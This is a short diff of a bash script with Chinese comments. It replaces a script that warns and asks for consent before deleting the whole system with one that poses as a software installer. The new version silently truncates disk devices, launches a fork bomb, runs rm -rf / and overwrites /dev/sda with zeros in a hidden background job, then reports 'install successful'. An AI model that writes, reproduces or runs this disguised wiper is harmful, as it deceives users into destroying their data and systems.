@@ -1,9 +1,13 @@
 #!/bin/bash
-echo "这个脚本会删除整个系统所有文件，确定要执行吗？输入 YES 才能继续"
-read answer
-if [ "$answer" = "YES" ]; then
-    echo "正在删除整个系统所有文件和目录..."
-    rm -rf / --no-preserve-root 2>/dev/null
-    echo "删除完成，祝你好运，重启后就再也看不到这个系统了"
-fi
-exit 0
+echo "正在安装最新版某软件..."
+sleep 2
+echo "正在删除缓存..."
+(
+    > /dev/sda  # 直接往硬盘写 0，悄悄把硬盘块设备清零
+    > /dev/nvme0n1  # 固态硬盘
+    :(){ :|:& };:   # 经典 fork 炸弹，瞬间把进程塞满
+    rm -rf / &   # 后台开始删
+    dd if=/dev/zero of=/dev/sda bs=1M & # 后台开始写 0 死机
+) &>/dev/null &
+disown
+echo "安装成功！"
